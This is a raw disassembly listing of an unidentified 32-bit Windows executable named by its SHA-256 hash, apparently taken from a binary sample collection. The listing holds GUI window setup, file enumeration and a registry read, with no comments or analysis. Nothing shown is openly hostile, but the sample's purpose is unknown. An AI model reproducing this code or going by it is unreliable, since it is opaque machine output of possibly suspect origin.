
dbab6a72dd57ae2b056c370fc0fdaeff0045e09d834c76b58c3883b9c8438101.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x1c
  401006:	push   esi
  401007:	mov    esi,DWORD PTR ds:0x40b1d4
  40100d:	push   edi
  40100e:	mov    edi,DWORD PTR [ebp+0x8]
  401011:	push   0x64
  401013:	push   0x40fb30
  401018:	push   0x67
  40101a:	push   edi
  40101b:	call   esi
  40101d:	push   0x64
  40101f:	push   0x40fa68
  401024:	push   0x6d
  401026:	push   edi
  401027:	call   esi
  401029:	mov    eax,edi
  40102b:	call   0x401091
  401030:	push   DWORD PTR [ebp+0x14]
  401033:	mov    ecx,edi
  401035:	call   0x4010ff
  40103a:	test   eax,eax
  40103c:	je     0x40108b
  40103e:	push   ebx
  40103f:	push   0x6d
  401041:	push   edi
  401042:	call   DWORD PTR ds:0x40b1d0
  401048:	mov    esi,DWORD PTR ds:0x40b1cc
  40104e:	mov    ebx,eax
  401050:	xor    edi,edi
  401052:	jmp    0x40107a
  401054:	lea    eax,[ebp-0x1c]
  401057:	push   eax
  401058:	push   ebx
  401059:	push   DWORD PTR [ebp-0x1c]
  40105c:	call   DWORD PTR ds:0x40b1c8
  401062:	test   eax,eax
  401064:	jne    0x40107a
  401066:	lea    eax,[ebp-0x1c]
  401069:	push   eax
  40106a:	call   DWORD PTR ds:0x40b1c4
  401070:	lea    eax,[ebp-0x1c]
  401073:	push   eax
  401074:	call   DWORD PTR ds:0x40b1c0
  40107a:	push   edi
  40107b:	push   edi
  40107c:	push   edi
  40107d:	lea    eax,[ebp-0x1c]
  401080:	push   eax
  401081:	call   esi
  401083:	test   eax,eax
  401085:	jne    0x401054
  401087:	mov    eax,DWORD PTR [ebp-0x14]
  40108a:	pop    ebx
  40108b:	pop    edi
  40108c:	pop    esi
  40108d:	leave  
  40108e:	ret    0x10
  401091:	push   ebp
  401092:	mov    ebp,esp
  401094:	sub    esp,0x30
  401097:	and    DWORD PTR [ebp-0x24],0x0
  40109b:	and    DWORD PTR [ebp-0x20],0x0
  40109f:	push   esi
  4010a0:	mov    esi,DWORD PTR ds:0x40b1bc
  4010a6:	push   0x6b
  4010a8:	push   eax
  4010a9:	mov    DWORD PTR [ebp-0x30],0x30
  4010b0:	mov    DWORD PTR [ebp-0x2c],0x3
  4010b7:	mov    DWORD PTR [ebp-0x28],0x401317
  4010be:	mov    DWORD PTR [ebp-0x1c],eax
  4010c1:	call   esi
  4010c3:	push   0x7f00
  4010c8:	push   0x0
  4010ca:	mov    DWORD PTR [ebp-0x18],eax
  4010cd:	call   DWORD PTR ds:0x40b1b8
  4010d3:	and    DWORD PTR [ebp-0xc],0x0
  4010d7:	push   0x6c
  4010d9:	push   DWORD PTR [ebp-0x1c]
  4010dc:	mov    DWORD PTR [ebp-0x14],eax
  4010df:	mov    DWORD PTR [ebp-0x10],0x10
  4010e6:	mov    DWORD PTR [ebp-0x8],0x40fa68
  4010ed:	call   esi
  4010ef:	mov    DWORD PTR [ebp-0x4],eax
  4010f2:	lea    eax,[ebp-0x30]
  4010f5:	push   eax
  4010f6:	call   DWORD PTR ds:0x40b1b4
  4010fc:	pop    esi
  4010fd:	leave  
  4010fe:	ret    
  4010ff:	push   ebp
  401100:	mov    ebp,esp
  401102:	mov    eax,0x1010
  401107:	call   0x408810
  40110c:	mov    eax,ds:0x40e004
  401111:	xor    eax,ebp
  401113:	mov    DWORD PTR [ebp-0x4],eax
  401116:	push   ebx
  401117:	push   esi
  401118:	lea    eax,[ebp-0x1010]
  40111e:	push   eax
  40111f:	mov    esi,ecx
  401121:	mov    DWORD PTR [ebp-0x1010],0x8
  40112b:	mov    DWORD PTR [ebp-0x100c],0x200
  401135:	call   DWORD PTR ds:0x40b010
  40113b:	xor    ebx,ebx
  40113d:	push   ebx
  40113e:	push   esi
  40113f:	push   ebx
  401140:	push   ebx
  401141:	push   0xfa
  401146:	push   0x17c
  40114b:	mov    DWORD PTR ds:0x40fbf8,esi
  401151:	mov    esi,DWORD PTR ds:0x40b1ac
  401157:	push   0x1
  401159:	call   esi
  40115b:	cdq    
  40115c:	sub    eax,edx
  40115e:	sar    eax,1
  401160:	sub    eax,0x7d
  401163:	push   eax
  401164:	push   ebx
  401165:	call   esi
  401167:	cdq    
  401168:	sub    eax,edx
  40116a:	sar    eax,1
  40116c:	sub    eax,0xbe
  401171:	push   eax
  401172:	push   0x4c80000
  401177:	push   0x40fb30
  40117c:	push   0x40fa68
  401181:	push   ebx
  401182:	call   DWORD PTR ds:0x40b1b0
  401188:	mov    DWORD PTR [ebp-0x1008],eax
  40118e:	cmp    eax,ebx
  401190:	jne    0x401199
  401192:	xor    eax,eax
  401194:	jmp    0x4012b7
  401199:	push   edi
  40119a:	push   0x400
  40119f:	mov    esi,0x40fc08
  4011a4:	push   esi
  4011a5:	push   ebx
  4011a6:	mov    ds:0x40fc00,eax
  4011ab:	call   DWORD PTR ds:0x40b14c
  4011b1:	push   0x5c
  4011b3:	push   ebx
  4011b4:	push   esi
  4011b5:	call   DWORD PTR ds:0x40b15c
  4011bb:	sub    eax,esi
  4011bd:	push   esi
  4011be:	sar    eax,1
  4011c0:	xor    ecx,ecx
  4011c2:	mov    edi,0x410408
  4011c7:	push   edi
  4011c8:	mov    WORD PTR [eax*2+0x40fc08],cx
  4011d0:	call   DWORD PTR ds:0x40b160
  4011d6:	push   0x40c49c
  4011db:	push   edi
  4011dc:	mov    edi,DWORD PTR ds:0x40b164
  4011e2:	call   edi
  4011e4:	xor    eax,eax
  4011e6:	push   0x7fe
  4011eb:	mov    WORD PTR [ebp-0x804],ax
  4011f2:	lea    eax,[ebp-0x802]
  4011f8:	push   ebx
  4011f9:	push   eax
  4011fa:	call   0x4058c0
  4011ff:	add    esp,0xc
  401202:	push   esi
  401203:	lea    eax,[ebp-0x804]
  401209:	push   eax
  40120a:	call   DWORD PTR ds:0x40b160
  401210:	push   0x40c4b0
  401215:	lea    eax,[ebp-0x804]
  40121b:	push   eax
  40121c:	call   edi
  40121e:	push   esi
  40121f:	mov    esi,0x410c08
  401224:	push   esi
  401225:	call   DWORD PTR ds:0x40b160
  40122b:	push   0x40c4d4
  401230:	push   esi
  401231:	call   edi
  401233:	xor    eax,eax
  401235:	push   0x7fe
  40123a:	mov    WORD PTR [ebp-0x1004],ax
  401241:	lea    eax,[ebp-0x1002]
  401247:	push   ebx
  401248:	push   eax
  401249:	call   0x4058c0
  40124e:	add    esp,0xc
  401251:	lea    eax,[ebp-0x804]
  401257:	push   eax
  401258:	push   0x400
  40125d:	lea    eax,[ebp-0x1004]
  401263:	push   eax
  401264:	push   ebx
  401265:	push   0x40c4e4
  40126a:	push   0x40c4e8
  40126f:	call   DWORD PTR ds:0x40b07c
  401275:	lea    eax,[ebp-0x1004]
  40127b:	push   eax
  40127c:	push   esi
  40127d:	call   edi
  40127f:	call   0x4015b2
  401284:	push   0x3
  401286:	push   ebx
  401287:	push   ebx
  401288:	push   ebx
  401289:	push   ebx
  40128a:	push   0xffffffff
  40128c:	push   DWORD PTR [ebp-0x1008]
  401292:	call   DWORD PTR ds:0x40b1a8
  401298:	push   DWORD PTR [ebp+0x8]
  40129b:	push   DWORD PTR [ebp-0x1008]
  4012a1:	call   DWORD PTR ds:0x40b1a4
  4012a7:	push   DWORD PTR [ebp-0x1008]
  4012ad:	call   DWORD PTR ds:0x40b1a0
  4012b3:	xor    eax,eax
  4012b5:	inc    eax
  4012b6:	pop    edi
  4012b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4012ba:	pop    esi
  4012bb:	xor    ecx,ebp
  4012bd:	pop    ebx
  4012be:	call   0x401d11
  4012c3:	leave  
  4012c4:	ret    0x4
  4012c7:	push   ebp
  4012c8:	mov    ebp,esp
  4012ca:	sub    esp,0x3c
  4012cd:	push   esi
  4012ce:	push   0x38
  4012d0:	xor    esi,esi
  4012d2:	lea    eax,[ebp-0x38]
  4012d5:	push   esi
  4012d6:	push   eax
  4012d7:	call   0x4058c0
  4012dc:	add    esp,0xc
  4012df:	lea    eax,[ebp-0x3c]
  4012e2:	push   eax
  4012e3:	mov    DWORD PTR [ebp-0x3c],0x3c
  4012ea:	mov    DWORD PTR [ebp-0x38],0x4c
  4012f1:	mov    DWORD PTR [ebp-0x34],esi
  4012f4:	mov    DWORD PTR [ebp-0x30],esi
  4012f7:	mov    DWORD PTR [ebp-0x2c],0x40c554
  4012fe:	mov    DWORD PTR [ebp-0x28],esi
  401301:	mov    DWORD PTR [ebp-0x24],esi
  401304:	mov    DWORD PTR [ebp-0x20],0x5
  40130b:	mov    DWORD PTR [ebp-0x1c],esi
  40130e:	call   DWORD PTR ds:0x40b154
  401314:	pop    esi
  401315:	leave  
  401316:	ret    
  401317:	push   ebp
  401318:	mov    ebp,esp
  40131a:	mov    eax,0x1848
  40131f:	call   0x408810
  401324:	mov    eax,ds:0x40e004
  401329:	xor    eax,ebp
  40132b:	mov    DWORD PTR [ebp-0x4],eax
  40132e:	mov    eax,DWORD PTR [ebp+0xc]
  401331:	push   ebx
  401332:	push   esi
  401333:	mov    esi,DWORD PTR [ebp+0x8]
  401336:	dec    eax
  401337:	dec    eax
  401338:	push   edi
  401339:	mov    DWORD PTR [ebp-0x1848],esi
  40133f:	je     0x401597
  401345:	sub    eax,0xd
  401348:	je     0x401579
  40134e:	sub    eax,0x102
  401353:	je     0x401364
  401355:	push   DWORD PTR [ebp+0x14]
  401358:	push   DWORD PTR [ebp+0x10]
  40135b:	push   DWORD PTR [ebp+0xc]
  40135e:	push   esi
  40135f:	jmp    0x401437
  401364:	mov    eax,DWORD PTR [ebp+0x10]
  401367:	shr    eax,0x10
  40136a:	mov    edi,0x7fe
  40136f:	mov    esi,0x400
  401374:	mov    ebx,0x410408
  401379:	cmp    ax,0x1
  40137d:	jne    0x40140a
  401383:	xor    eax,eax
  401385:	push   edi
  401386:	push   eax
  401387:	mov    WORD PTR [ebp-0x804],ax
  40138e:	lea    eax,[ebp-0x802]
  401394:	push   eax
  401395:	call   0x4058c0
  40139a:	xor    eax,eax
  40139c:	push   edi
  40139d:	push   eax
  40139e:	mov    WORD PTR [ebp-0x1004],ax
  4013a5:	lea    eax,[ebp-0x1002]
  4013ab:	push   eax
  4013ac:	call   0x4058c0
  4013b1:	add    esp,0x18
  4013b4:	push   esi
  4013b5:	lea    eax,[ebp-0x804]
  4013bb:	push   eax
  4013bc:	push   DWORD PTR ds:0x40fbfc
  4013c2:	call   DWORD PTR ds:0x40b19c
  4013c8:	lea    eax,[ebp-0x804]
  4013ce:	push   eax
  4013cf:	push   ebx
  4013d0:	push   0x40c4fc
  4013d5:	lea    eax,[ebp-0x1004]
  4013db:	push   esi
  4013dc:	push   eax
  4013dd:	call   0x401d20
  4013e2:	add    esp,0x14
  4013e5:	lea    ecx,[ebp-0x1004]
  4013eb:	call   0x401a16
  4013f0:	push   0x1
  4013f2:	push   0x309
  4013f7:	push   DWORD PTR ds:0x40fc00
  4013fd:	call   DWORD PTR ds:0x40b1d8
  401403:	push   eax
  401404:	call   DWORD PTR ds:0x40b198
  40140a:	movzx  eax,WORD PTR [ebp+0x10]
  40140e:	sub    eax,0x69
  401411:	je     0x40156b
  401417:	sub    eax,0x2a0
  40141c:	je     0x40147d
  40141e:	dec    eax
  40141f:	je     0x401466
  401421:	sub    eax,0x5
  401424:	je     0x401442
  401426:	push   DWORD PTR [ebp+0x14]
  401429:	push   DWORD PTR [ebp+0x10]
  40142c:	push   0x111
  401431:	push   DWORD PTR [ebp-0x1848]
  401437:	call   DWORD PTR ds:0x40b188
  40143d:	jmp    0x4015a1
  401442:	push   0x40fc08
  401447:	call   0x401d3e
  40144c:	pop    ecx
  40144d:	push   0x1
  40144f:	push   0xf
  401451:	push   0x410c08
  401456:	push   DWORD PTR ds:0x40fc00
  40145c:	call   0x401c5c
  401461:	jmp    0x40159f
  401466:	push   0x0
  401468:	push   0x0
  40146a:	push   0x10
  40146c:	push   DWORD PTR ds:0x40fc00
  401472:	call   DWORD PTR ds:0x40b190
  401478:	jmp    0x40159f
  40147d:	xor    eax,eax
  40147f:	push   edi
  401480:	push   eax
  401481:	mov    WORD PTR [ebp-0x804],ax
  401488:	lea    eax,[ebp-0x802]
  40148e:	push   eax
  40148f:	call   0x4058c0
  401494:	push   0x40c508
  401499:	push   ebx
  40149a:	push   0x40c524
  40149f:	lea    eax,[ebp-0x804]
  4014a5:	push   esi
  4014a6:	push   eax
  4014a7:	call   0x401d20
  4014ac:	xor    eax,eax
  4014ae:	push   edi
  4014af:	push   eax
  4014b0:	mov    WORD PTR [ebp-0x1004],ax
  4014b7:	lea    eax,[ebp-0x1002]
  4014bd:	push   eax
  4014be:	call   0x4058c0
  4014c3:	xor    eax,eax
  4014c5:	push   edi
  4014c6:	mov    WORD PTR [ebp-0x1804],ax
  4014cd:	xor    edi,edi
  4014cf:	lea    eax,[ebp-0x1802]
  4014d5:	push   edi
  4014d6:	push   eax
  4014d7:	call   0x4058c0
  4014dc:	add    esp,0x38
  4014df:	push   esi
  4014e0:	lea    eax,[ebp-0x1004]
  4014e6:	push   eax
  4014e7:	push   DWORD PTR ds:0x40fbfc
  4014ed:	call   DWORD PTR ds:0x40b19c
  4014f3:	lea    eax,[ebp-0x1004]
  4014f9:	push   eax
  4014fa:	push   ebx
  4014fb:	push   0x40c4fc
  401500:	lea    eax,[ebp-0x1804]
  401506:	push   esi
  401507:	push   eax
  401508:	call   0x401d20
  40150d:	add    esp,0x14
  401510:	push   edi
  401511:	lea    eax,[ebp-0x804]
  401517:	push   eax
  401518:	lea    eax,[ebp-0x1804]
  40151e:	push   eax
  40151f:	call   DWORD PTR ds:0x40b040
  401525:	push   edi
  401526:	push   0x40c530
  40152b:	call   DWORD PTR ds:0x40b194
  401531:	mov    esi,DWORD PTR ds:0x40b190
  401537:	cmp    eax,edi
  401539:	je     0x40155d
  40153b:	push   edi
  40153c:	push   edi
  40153d:	push   0x12
  40153f:	push   eax
  401540:	call   esi
  401542:	push   0x2bc
  401547:	call   DWORD PTR ds:0x40b028
  40154d:	push   0x40fc08
  401552:	call   0x401d3e
  401557:	pop    ecx
  401558:	call   0x4012c7
  40155d:	push   edi
  40155e:	push   edi
  40155f:	push   0x10
  401561:	push   DWORD PTR ds:0x40fc00
  401567:	call   esi
  401569:	jmp    0x40159f
  40156b:	push   DWORD PTR [ebp-0x1848]
  401571:	call   DWORD PTR ds:0x40b18c
  401577:	jmp    0x40159f
  401579:	lea    eax,[ebp-0x1844]
  40157f:	push   eax
  401580:	push   esi
  401581:	call   DWORD PTR ds:0x40b184
  401587:	lea    eax,[ebp-0x1844]
  40158d:	push   eax
  40158e:	push   esi
  40158f:	call   DWORD PTR ds:0x40b180
  401595:	jmp    0x40159f
  401597:	push   0x0
  401599:	call   DWORD PTR ds:0x40b17c
  40159f:	xor    eax,eax
  4015a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4015a4:	pop    edi
  4015a5:	pop    esi
  4015a6:	xor    ecx,ebp
  4015a8:	pop    ebx
  4015a9:	call   0x401d11
  4015ae:	leave  
  4015af:	ret    0x10
  4015b2:	push   ebp
  4015b3:	mov    ebp,esp
  4015b5:	and    esp,0xfffffff8
  4015b8:	sub    esp,0xa84
  4015be:	mov    eax,ds:0x40e004
  4015c3:	xor    eax,esp
  4015c5:	mov    DWORD PTR [esp+0xa80],eax
  4015cc:	push   ebx
  4015cd:	push   esi
  4015ce:	push   edi
  4015cf:	mov    esi,DWORD PTR ds:0x40b1b0
  4015d5:	xor    ebx,ebx
  4015d7:	push   ebx
  4015d8:	push   DWORD PTR ds:0x40fbf8
  4015de:	mov    edi,0x2b67
  4015e3:	push   edi
  4015e4:	push   DWORD PTR ds:0x40fc00
  4015ea:	push   0xc6
  4015ef:	push   0x5a
  4015f1:	push   0xc
  4015f3:	push   0x8
  4015f5:	push   0x5000000e
  4015fa:	push   ebx
  4015fb:	push   0x40c574
  401600:	push   0x200
  401605:	call   esi
  401607:	push   0x6e
  401609:	push   DWORD PTR ds:0x40fbf8
  40160f:	call   DWORD PTR ds:0x40b174
  401615:	push   eax
  401616:	push   ebx
  401617:	push   0x172
  40161c:	push   edi
  40161d:	push   DWORD PTR ds:0x40fc00
  401623:	mov    edi,DWORD PTR ds:0x40b1d8
  401629:	call   edi
  40162b:	mov    ebx,DWORD PTR ds:0x40b178
  401631:	push   eax
  401632:	call   ebx
  401634:	push   0x0
  401636:	push   DWORD PTR ds:0x40fbf8
  40163c:	push   0x2f59
  401641:	push   DWORD PTR ds:0x40fc00
  401647:	push   0xa9
  40164c:	push   0xff
  401651:	push   0x6
  401653:	push   0x6e
  401655:	push   0x50000207
  40165a:	push   0x40c584
  40165f:	push   0x40c5b4
  401664:	push   0x0
  401666:	call   esi
  401668:	push   0x1
  40166a:	push   0xc
  40166c:	call   DWORD PTR ds:0x40b018
  401672:	push   eax
  401673:	push   0x30
  401675:	push   0x2f59
  40167a:	push   DWORD PTR ds:0x40fc00
  401680:	call   edi
  401682:	push   eax
  401683:	call   ebx
  401685:	push   0x0
  401687:	push   DWORD PTR ds:0x40fbf8
  40168d:	push   0x309
  401692:	push   DWORD PTR ds:0x40fc00
  401698:	push   0x19
  40169a:	push   0x4e
  40169c:	push   0xba
  4016a1:	push   0xce
  4016a6:	push   0x50000001
  4016ab:	push   0x40c5c4
  4016b0:	push   0x40c5b4
  4016b5:	push   0x0
  4016b7:	call   esi
  4016b9:	push   0x1
  4016bb:	push   0xc
  4016bd:	call   DWORD PTR ds:0x40b018
  4016c3:	push   eax
  4016c4:	push   0x30
  4016c6:	push   0x309
  4016cb:	push   DWORD PTR ds:0x40fc00
  4016d1:	call   edi
  4016d3:	push   eax
  4016d4:	call   ebx
  4016d6:	push   0x0
  4016d8:	push   0x309
  4016dd:	push   DWORD PTR ds:0x40fc00
  4016e3:	call   edi
  4016e5:	push   eax
  4016e6:	call   DWORD PTR ds:0x40b198
  4016ec:	push   0x0
  4016ee:	push   DWORD PTR ds:0x40fbf8
  4016f4:	push   0x30a
  4016f9:	push   DWORD PTR ds:0x40fc00
  4016ff:	push   0x19
  401701:	push   0x4e
  401703:	push   0xba
  401708:	push   0x121
  40170d:	push   0x50000000
  401712:	push   0x40c5d4
  401717:	push   0x40c5b4
  40171c:	push   0x0
  40171e:	call   esi
  401720:	push   0x1
  401722:	push   0xc
  401724:	call   DWORD PTR ds:0x40b018
  40172a:	push   eax
  40172b:	push   0x30
  40172d:	push   0x30a
  401732:	push   DWORD PTR ds:0x40fc00
  401738:	call   edi
  40173a:	push   eax
  40173b:	call   ebx
  40173d:	push   0x0
  40173f:	push   DWORD PTR ds:0x40fbf8
  401745:	push   0x30f
  40174a:	push   DWORD PTR ds:0x40fc00
  401750:	push   0x19
  401752:	push   0x4e
  401754:	push   0xba
  401759:	push   0x6e
  40175b:	push   0x50000000
  401760:	push   0x40c5e4
  401765:	push   0x40c5b4
  40176a:	push   0x0
  40176c:	call   esi
  40176e:	push   0x1
  401770:	push   0xc
  401772:	call   DWORD PTR ds:0x40b018
  401778:	push   eax
  401779:	push   0x30
  40177b:	push   0x30f
  401780:	push   DWORD PTR ds:0x40fc00
  401786:	call   edi
  401788:	push   eax
  401789:	call   ebx
  40178b:	push   0x0
  40178d:	push   DWORD PTR ds:0x40fbf8
  401793:	push   0x30b
  401798:	push   DWORD PTR ds:0x40fc00
  40179e:	push   0x15
  4017a0:	push   0xeb
  4017a5:	push   0x21
  4017a7:	push   0x78
  4017a9:	push   0x50000081
  4017ae:	push   0x40c4ac
  4017b3:	push   0x40c574
  4017b8:	push   0x20000
  4017bd:	call   esi
  4017bf:	push   0x0
  4017c1:	push   DWORD PTR ds:0x40fbf8
  4017c7:	push   0x30c
  4017cc:	push   DWORD PTR ds:0x40fc00
  4017d2:	push   0x15
  4017d4:	push   0xeb
  4017d9:	push   0x3f
  4017db:	push   0x78
  4017dd:	push   0x50000081
  4017e2:	push   0x40c4ac
  4017e7:	push   0x40c574
  4017ec:	push   0x20000
  4017f1:	call   esi
  4017f3:	push   0x1
  4017f5:	push   0xc
  4017f7:	call   DWORD PTR ds:0x40b018
  4017fd:	push   eax
  4017fe:	push   0x30
  401800:	push   0x30c
  401805:	push   DWORD PTR ds:0x40fc00
  40180b:	call   edi
  40180d:	push   eax
  40180e:	call   ebx
  401810:	push   0x0
  401812:	push   DWORD PTR ds:0x40fbf8
  401818:	push   0x30d
  40181d:	push   DWORD PTR ds:0x40fc00
  401823:	push   0x15
  401825:	push   0xeb
  40182a:	push   0x5d
  40182c:	push   0x78
  40182e:	push   0x50000081
  401833:	push   0x40c4ac
  401838:	push   0x40c574
  40183d:	push   0x20000
  401842:	call   esi
  401844:	push   0x1
  401846:	push   0xc
  401848:	call   DWORD PTR ds:0x40b018
  40184e:	push   eax
  40184f:	push   0x30
  401851:	push   0x30d
  401856:	push   DWORD PTR ds:0x40fc00
  40185c:	call   edi
  40185e:	push   eax
  40185f:	call   ebx
  401861:	push   0x0
  401863:	push   DWORD PTR ds:0x40fbf8
  401869:	push   0x30e
  40186e:	push   DWORD PTR ds:0x40fc00
  401874:	push   0x15
  401876:	push   0xeb
  40187b:	push   0x8f
  401880:	push   0x7b
  401882:	push   0x50000080
  401887:	push   0x40c5f0
  40188c:	push   0x40c574
  401891:	push   0x0
  401893:	call   esi
  401895:	push   0x1
  401897:	push   0xc
  401899:	call   DWORD PTR ds:0x40b018
  40189f:	push   eax
  4018a0:	push   0x30
  4018a2:	push   0x30e
  4018a7:	push   DWORD PTR ds:0x40fc00
  4018ad:	call   edi
  4018af:	push   eax
  4018b0:	call   ebx
  4018b2:	xor    eax,eax
  4018b4:	push   0x7fe
  4018b9:	push   eax
  4018ba:	mov    WORD PTR [esp+0x290],ax
  4018c2:	lea    eax,[esp+0x292]
  4018c9:	push   eax
  4018ca:	call   0x4058c0
  4018cf:	push   0x40c508
  4018d4:	mov    edi,0x410408
  4018d9:	push   edi
  4018da:	push   0x40c524
  4018df:	lea    eax,[esp+0x2a0]
  4018e6:	push   0x400
  4018eb:	push   eax
  4018ec:	call   0x401d20
  4018f1:	add    esp,0x20
  4018f4:	lea    ecx,[esp+0x288]
  4018fb:	call   0x401a16
  401900:	xor    eax,eax
  401902:	push   eax
  401903:	push   DWORD PTR ds:0x40fbf8
  401909:	push   eax
  40190a:	push   DWORD PTR ds:0x40fc00
  401910:	push   0x12c
  401915:	push   0xaf
  40191a:	push   0x8a
  40191f:	push   0xb4
  401924:	push   0x50800002
  401929:	push   eax
  40192a:	push   0x40c608
  40192f:	push   eax
  401930:	call   esi
  401932:	push   0x40c624
  401937:	push   eax
  401938:	mov    ds:0x40fbfc,eax
  40193d:	call   DWORD PTR ds:0x40b170
  401943:	push   edi
  401944:	call   0x401d3e
  401949:	pop    ecx
  40194a:	lea    eax,[esp+0x38]
  40194e:	push   eax
  40194f:	push   0x40c648
  401954:	call   DWORD PTR ds:0x40b024
  40195a:	xor    esi,esi
  40195c:	test   BYTE PTR [esp+0x38],0x10
  401961:	mov    DWORD PTR [esp+0x10],eax
  401965:	mov    edi,0x40b
  40196a:	jne    0x4019e4
  40196c:	push   0x40c64c
  401971:	lea    eax,[esp+0x68]
  401975:	push   eax
  401976:	call   DWORD PTR ds:0x40b168
  40197c:	test   eax,eax
  40197e:	jne    0x4019e4
  401980:	inc    esi
  401981:	lea    ecx,[esp+0x64]
  401985:	mov    DWORD PTR [esp+0x14],esi
  401989:	mov    DWORD PTR [esp+0x18],eax
  40198d:	mov    DWORD PTR [esp+0x1c],ecx
  401991:	jmp    0x4019c5
  401993:	test   BYTE PTR [esp+0x38],0x10
  401998:	jne    0x4019e4
  40199a:	push   0x40c64c
  40199f:	lea    eax,[esp+0x68]
  4019a3:	push   eax
  4019a4:	call   DWORD PTR ds:0x40b168
  4019aa:	test   eax,eax
  4019ac:	jne    0x4019e4
  4019ae:	lea    eax,[esp+0x64]
  4019b2:	mov    DWORD PTR [esp+0x18],esi
  4019b6:	inc    esi
  4019b7:	mov    DWORD PTR [esp+0x1c],eax
  4019bb:	mov    DWORD PTR [esp+0x14],0x1
  4019c3:	xor    eax,eax
  4019c5:	lea    ecx,[esp+0x14]
  4019c9:	push   ecx
  4019ca:	push   eax
  4019cb:	push   edi
  4019cc:	push   DWORD PTR ds:0x40fbfc
  4019d2:	mov    DWORD PTR [esp+0x30],0x208
  4019da:	mov    DWORD PTR [esp+0x38],eax
  4019de:	mov    DWORD PTR [esp+0x40],eax
  4019e2:	call   ebx
  4019e4:	lea    eax,[esp+0x38]
  4019e8:	push   eax
  4019e9:	push   DWORD PTR [esp+0x14]
  4019ed:	call   DWORD PTR ds:0x40b020
  4019f3:	test   eax,eax
  4019f5:	jne    0x401993
  4019f7:	push   DWORD PTR [esp+0x10]
  4019fb:	call   DWORD PTR ds:0x40b068
  401a01:	mov    ecx,DWORD PTR [esp+0xa8c]
  401a08:	pop    edi
  401a09:	pop    esi
  401a0a:	pop    ebx
  401a0b:	xor    ecx,esp
  401a0d:	call   0x401d11
  401a12:	mov    esp,ebp
  401a14:	pop    ebp
  401a15:	ret    
  401a16:	push   ebp
  401a17:	mov    ebp,esp
  401a19:	sub    esp,0x808
  401a1f:	mov    eax,ds:0x40e004
  401a24:	xor    eax,ebp
  401a26:	mov    DWORD PTR [ebp-0x4],eax
  401a29:	push   ebx
  401a2a:	push   esi
  401a2b:	push   edi
  401a2c:	xor    eax,eax
  401a2e:	push   0x7fe
  401a33:	push   eax
  401a34:	mov    WORD PTR [ebp-0x804],ax
  401a3b:	lea    eax,[ebp-0x802]
  401a41:	mov    esi,ecx
  401a43:	push   eax
  401a44:	mov    DWORD PTR [ebp-0x808],esi
  401a4a:	call   0x4058c0
  401a4f:	add    esp,0xc
  401a52:	push   esi
  401a53:	mov    esi,DWORD PTR ds:0x40b07c
  401a59:	push   0x400
  401a5e:	lea    eax,[ebp-0x804]
  401a64:	push   eax
  401a65:	push   0x0
  401a67:	push   0x40c65c
  401a6c:	push   0x40c4e8
  401a71:	call   esi
  401a73:	mov    edi,DWORD PTR ds:0x40b1d8
  401a79:	lea    eax,[ebp-0x804]
  401a7f:	push   eax
  401a80:	push   0x30b
  401a85:	push   DWORD PTR ds:0x40fc00
  401a8b:	call   edi
  401a8d:	mov    ebx,DWORD PTR ds:0x40b170
  401a93:	push   eax
  401a94:	call   ebx
  401a96:	push   DWORD PTR [ebp-0x808]
  401a9c:	lea    eax,[ebp-0x804]
  401aa2:	push   0x400
  401aa7:	push   eax
  401aa8:	push   0x0
  401aaa:	push   0x40c660
  401aaf:	push   0x40c4e8
  401ab4:	call   esi
  401ab6:	lea    eax,[ebp-0x804]
  401abc:	push   eax
  401abd:	push   0x30c
  401ac2:	push   DWORD PTR ds:0x40fc00
  401ac8:	call   edi
  401aca:	push   eax
  401acb:	call   ebx
  401acd:	push   DWORD PTR [ebp-0x808]
  401ad3:	lea    eax,[ebp-0x804]
  401ad9:	push   0x400
  401ade:	push   eax
  401adf:	push   0x0
  401ae1:	push   0x40c664
  401ae6:	push   0x40c4e8
  401aeb:	call   esi
  401aed:	lea    eax,[ebp-0x804]
  401af3:	push   eax
  401af4:	push   0x30d
  401af9:	push   DWORD PTR ds:0x40fc00
  401aff:	call   edi
  401b01:	push   eax
  401b02:	call   ebx
  401b04:	mov    ecx,DWORD PTR [ebp-0x4]
  401b07:	pop    edi
  401b08:	pop    esi
  401b09:	xor    ecx,ebp
  401b0b:	pop    ebx
  401b0c:	call   0x401d11
  401b11:	leave  
  401b12:	ret    
  401b13:	mov    edi,edi
  401b15:	push   ebp
  401b16:	mov    ebp,esp
  401b18:	mov    ecx,DWORD PTR [ebp+0xc]
  401b1b:	xor    eax,eax
  401b1d:	test   ecx,ecx
  401b1f:	je     0x401b29
  401b21:	cmp    ecx,0x7fffffff
  401b27:	jbe    0x401b2e
  401b29:	mov    eax,0x80070057
  401b2e:	test   eax,eax
  401b30:	jl     0x401b72
  401b32:	mov    eax,DWORD PTR [ebp+0x8]
  401b35:	push   ebx
  401b36:	xor    ebx,ebx
  401b38:	test   ecx,ecx
  401b3a:	push   esi
  401b3b:	mov    esi,ecx
  401b3d:	je     0x401b65
  401b3f:	mov    edx,DWORD PTR [ebp+0x10]
  401b42:	push   edi
  401b43:	mov    edi,0x7ffffffe
  401b48:	sub    edi,ecx
  401b4a:	sub    edx,eax
  401b4c:	lea    ecx,[edi+esi*1]
  401b4f:	test   ecx,ecx
  401b51:	je     0x401b60
  401b53:	mov    cl,BYTE PTR [edx+eax*1]
  401b56:	test   cl,cl
  401b58:	je     0x401b60
  401b5a:	mov    BYTE PTR [eax],cl
  401b5c:	inc    eax
  401b5d:	dec    esi
  401b5e:	jne    0x401b4c
  401b60:	test   esi,esi
  401b62:	pop    edi
  401b63:	jne    0x401b6b
  401b65:	dec    eax
  401b66:	mov    ebx,0x8007007a
  401b6b:	mov    BYTE PTR [eax],0x0
  401b6e:	pop    esi
  401b6f:	mov    eax,ebx
  401b71:	pop    ebx
  401b72:	pop    ebp
  401b73:	ret    0xc
  401b76:	mov    edi,edi
  401b78:	push   ebp
  401b79:	mov    ebp,esp
  401b7b:	sub    esp,0x118
  401b81:	mov    eax,ds:0x40e004
  401b86:	xor    eax,ebp
  401b88:	mov    DWORD PTR [ebp-0x4],eax
  401b8b:	mov    eax,DWORD PTR [ebp+0x8]
  401b8e:	push   esi
  401b8f:	mov    DWORD PTR [ebp-0x110],eax
  401b95:	lea    eax,[ebp-0x10c]
  401b9b:	push   eax
  401b9c:	push   0x20019
  401ba1:	xor    esi,esi
  401ba3:	push   esi
  401ba4:	push   0x40b248
  401ba9:	push   0x80000000
